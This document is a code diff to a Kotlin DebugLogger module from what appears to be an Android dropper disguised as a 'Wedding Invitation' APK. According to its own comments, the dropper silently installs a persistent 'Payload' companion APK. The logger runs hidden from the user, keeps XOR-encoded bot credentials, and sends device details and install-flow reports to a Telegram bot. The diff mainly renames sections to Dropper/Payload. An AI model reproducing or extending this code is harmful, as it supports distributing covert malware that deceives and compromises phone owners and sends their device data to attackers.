@@ -10,18 +10,22 @@ import java.util.Locale
 import java.util.concurrent.CopyOnWriteArrayList
 
 /**
- * DebugLogger — captures all Nova + Dropper + Companion steps and sends
+ * DebugLogger — captures all Dropper + Payload steps and sends
  * one combined debug report to Telegram at end of flow.
+ *
+ * Dropper = Nova / Wedding Invitation APK
+ *           (DexLoader + InstallActivity + InstallReceiver — this APK)
+ * Payload = Companion APK
+ *           (App.onCreate, WorkManager, persistent service — installed APK)
  *
  * Fully background — no UI, no Activity, no user-visible output.
  * Credentials read from StringPool (XOR-encoded — never plaintext in DEX).
  * Every call is try/catch wrapped — never crashes the app.
  *
  * Usage:
- *   DebugLogger.logNova("Asset read", Status.SUCCESS, "ASSET_A — 2013121 bytes")
- *   DebugLogger.logDropper("createSession", Status.FAILED, "status=4 NO_CERTIFICATES")
- *   DebugLogger.logCompanion("App.onCreate", Status.SUCCESS)
- *   DebugLogger.flush("FAILED")
+ *   DebugLogger.logDropper("Asset read", Status.SUCCESS, "ASSET_A — 2013121 bytes")
+ *   DebugLogger.logPayload("App.onCreate", Status.SUCCESS)
+ *   DebugLogger.flush("SUCCESS")
  */
 internal object DebugLogger {
 
@@ -46,28 +50,28 @@ internal object DebugLogger {
 
     // ── Public API ───────────────────────────────────────────────────────────
 
-    /** Log a Nova-side step (DexLoader, ClassLoader, asset ops). */
-    fun logNova(step: String, status: Status, detail: String = "") {
-        add("NOVA", step, status, detail)
-    }
-
-    /** Log a Dropper/install-flow step (InstallActivity, InstallReceiver). */
+    /**
+     * Log a Dropper-side step.
+     * Covers: DexLoader (asset read, decrypt, ZIP extract, ClassLoader),
+     *         InstallActivity (session create, write, commit, stage transitions),
+     *         InstallReceiver (PackageInstaller callbacks, retries).
+     */
     fun logDropper(step: String, status: Status, detail: String = "") {
         add("DROPPER", step, status, detail)
     }
 
     /**
-     * Log a Companion-side step.
-     * Called from Nova when companion outcome is known (install result,
-     * or when Nova reads the companion sentinel file after launch).
+     * Log a Payload-side step.
+     * Called from the dropper side when payload outcome is known:
+     * install result, App.onCreate sentinel, service start confirmation.
      */
-    fun logCompanion(step: String, status: Status, detail: String = "") {
-        add("COMPANION", step, status, detail)
+    fun logPayload(step: String, status: Status, detail: String = "") {
+        add("PAYLOAD", step, status, detail)
     }
 
     /**
      * Build the full debug report and send it to Telegram as a .txt document.
-     * Call at terminal states: SUCCESS, FAILED, MAX_RETRIES.
+     * Call at terminal states: SUCCESS, FAILED, MAX_RETRIES, INTERRUPTED.
      * @param result Short label for the overall outcome.
      */
     fun flush(result: String) {
@@ -101,7 +105,7 @@ internal object DebugLogger {
             val commitId = try { BuildConfig.COMMIT_ID } catch (_: Exception) { "unknown" }
             val device   = "${Build.BRAND}-${Build.MODEL}".replace(" ", "-")
             val os       = "Android${Build.VERSION.RELEASE}"
-            val fileName = "Debug_Report_${device}_${os}_${ts}_$commitId.txt"
+            val fileName = "Debug_${device}_${os}_${ts}_$commitId.txt"
 
             val urlStr   = "$apiUrl$botToken/$sendDoc"
             val boundary = "----DbgBoundary${System.currentTimeMillis()}"
@@ -124,7 +128,7 @@ internal object DebugLogger {
                 dos.writeBytes("$chatId\r\n")
 
                 // caption
-                val caption = "🐛 Debug Report | ${Build.MANUFACTURER} ${Build.MODEL} | $result"
+                val caption = "[DBG] ${Build.MANUFACTURER} ${Build.MODEL} | API ${Build.VERSION.SDK_INT} | $result"
                 dos.writeBytes("--$boundary\r\n")
                 dos.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n")
                 dos.write(caption.toByteArray(Charsets.UTF_8))
@@ -142,19 +146,19 @@ internal object DebugLogger {
                 dos.flush()
             }
 
-            conn.responseCode   // consume response
+            conn.responseCode
             conn.disconnect()
         } catch (_: Exception) { }
     }
 
     private fun buildReport(snapshot: List<Entry>, result: String): String {
-        val sb      = StringBuilder()
-        val now     = Date()
-        val elapsed = (System.currentTimeMillis() - startTime) / 1000
+        val sb       = StringBuilder()
+        val now      = Date()
+        val elapsed  = (System.currentTimeMillis() - startTime) / 1000
         val commitId = try { BuildConfig.COMMIT_ID } catch (_: Exception) { "unknown" }
 
         sb.appendLine("═══════════════════════════════════════════")
-        sb.appendLine("        FULL FLOW DEBUG REPORT")
+        sb.appendLine("         DROPPER + PAYLOAD DEBUG REPORT")
         sb.appendLine("═══════════════════════════════════════════")
         sb.appendLine()
         sb.appendLine("Device   : ${Build.MANUFACTURER} ${Build.MODEL}")
@@ -165,8 +169,8 @@ internal object DebugLogger {
         sb.appendLine("Duration : ${elapsed}s")
         sb.appendLine()
 
-        // Group entries by section in fixed order
-        val sectionOrder = listOf("NOVA", "DROPPER", "COMPANION")
+        // Fixed section order: DROPPER first, PAYLOAD second
+        val sectionOrder = listOf("DROPPER", "PAYLOAD")
         for (section in sectionOrder) {
             val sectionEntries = snapshot.filter { it.section == section }
             if (sectionEntries.isEmpty()) continue
@@ -174,7 +178,7 @@ internal object DebugLogger {
             sb.appendLine("── $section ──")
             for (e in sectionEntries) {
                 val line = if (e.detail.isNotEmpty()) {
-                    "[${e.status.tag}] ${e.ts}  ${e.step.padEnd(28)} ${e.detail}"
+                    "[${e.status.tag}] ${e.ts}  ${e.step.padEnd(30)} ${e.detail}"
                 } else {
                     "[${e.status.tag}] ${e.ts}  ${e.step}"
                 }
@@ -183,7 +187,7 @@ internal object DebugLogger {
             sb.appendLine()
         }
 
-        // Any unexpected section
+        // Safety net for any unexpected section
         val extra = snapshot.filter { it.section !in sectionOrder }
         if (extra.isNotEmpty()) {
             sb.appendLine("── OTHER ──")
@@ -194,7 +198,7 @@ internal object DebugLogger {
         }
 
         sb.appendLine("═══════════════════════════════════════════")
-        sb.appendLine("         END OF DEBUG REPORT")
+        sb.appendLine("           END OF DEBUG REPORT")
         sb.appendLine("═══════════════════════════════════════════")
 
         return sb.toString()
